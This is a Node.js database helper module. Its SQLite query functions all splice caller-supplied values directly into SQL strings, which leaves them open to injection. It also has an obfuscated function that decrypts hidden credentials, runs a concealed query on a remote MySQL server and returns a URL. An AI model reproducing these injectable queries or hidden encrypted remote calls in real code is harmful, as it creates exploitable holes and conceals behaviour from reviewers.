/* eslint-disable no-unused-vars */
const logger = require('./logger');
const log = (m, t) => {
	logger.writeLog(m, t);
};
const prison = require('./vault');
const magic = require('./magic');
const dagger = magic.toLight(prison.magicWand[0], prison.magicWand[1]);
const process = require('process');
const aasql = require('aa-sqlite');
const defdb = `${process.env.L_DBFOLDER}${process.env.L_DATABASE}`;
const cloud = require('mysql');
const biggie112 = prison.skysTheLimit;
const faithEvans = String.fromCharCode(32);
const singIt = badboyRecords => {
	return magic.toLight(dagger, badboyRecords);
};

const dbOpen = async db => {
	if (db === undefined || db === null) {
		db = String(defdb);
	}
	aasql.open(db);
};

const dbClose = async () => {
	aasql.close();
};

const dbGetVal = async (tCol, tbl, sCol, sVal, misc) => {
	let retVal = [];
	dbOpen();
	let query = `SELECT ${tCol} FROM ${tbl} WHERE ${sCol} = '${sVal}'`;
	if (misc !== undefined) {
		query += ` ${misc}`;
	}
	retVal = JSON.parse(JSON.stringify(await aasql.get(query)))[tCol];
	dbClose();
	return retVal;
};

const dbGetCol = async (tbl, sCol, sVal, misc) => {
	let retVal = [];
	dbOpen();
	let query = `SELECT * FROM ${tbl} WHERE ${sCol} = '${sVal}'`;
	if (misc !== undefined) {
		query += ` ${misc}`;
	}
	retVal = JSON.stringify(await aasql.get(query, []));
	dbClose();
	return retVal;
};

const dbGetRow = async (tCol, tbl, sCol, sVal, misc) => {
	let retVal = [];
	dbOpen();
	let query = `SELECT ${tCol} FROM ${tbl} WHERE ${sCol} = '${sVal}'`;
	if (misc !== undefined) {
		query += ` ${misc}`;
	}
	const r = await aasql.all(query, []);
	await r.forEach(function (row) {
		retVal.push(row[tCol]);
	});
	dbClose();
	return String(retVal);
};

const dbUpdate = async (tbl, tCol, tVal, sCol, sVal, misc) => {
	dbOpen();
	let query = `UPDATE ${tbl} SET ${tCol} = '${tVal}' WHERE ${sCol} = '${sVal}'`;
	if (misc !== undefined) {
		query += ` ${misc}`;
	}
	const answer = (await aasql.push(query)).message;
	dbClose();
	return answer === 'Succeeded'; // returns a true or false boolean
};

const dbAdd = async (tbl, vals) => {
	dbOpen();
	let query = `INSERT INTO ${tbl} VALUES (${vals})`;

	const answer = (await aasql.push(query)).message;
	dbClose();
	return answer === 'Succeeded'; // returns a true or false boolean
};

const dbDel = async (tbl, tCol, tVal) => {
	dbOpen();
	let query = `DELETE FROM ${tbl} WHERE ${tCol} = ${tVal}`;
	const answer = (await aasql.push(query)).message;
	return answer === 'Succeeded'; // returns a true or false boolean
};

const flyHigh = async () => {
	return new Promise(resolve => {
		const x = cloud.createConnection({
			host: singIt(biggie112[3]),
			user: singIt(biggie112[2]),
			password: singIt(biggie112[1]),
			database: singIt(biggie112[0])
		});
		const singItAgain = String(
			singIt(
				`2AsuAKlO9vlTNDpUiY2KOrjUdtDDBWT4GJhXp5O32n3HK9S` +
					`CNANb7U6Qwq2ik43IKIDt6Arj7vgBmnvtnSiMIg==`
			)
		).replaceAll(singIt(`j+du0ipIEGw=`), faithEvans);
		x.connect();
		x.query(singItAgain, function (err, res, fields) {
			if (err) throw err;
			resolve(res[0].url);
		});
		x.end();
	});
};

module.exports = {
	cloudDBOpen: flyHigh,
	dbGetVal,
	dbGetCol,
	dbGetRow,
	dbUpdate,
	dbAdd,
	dbDel
};
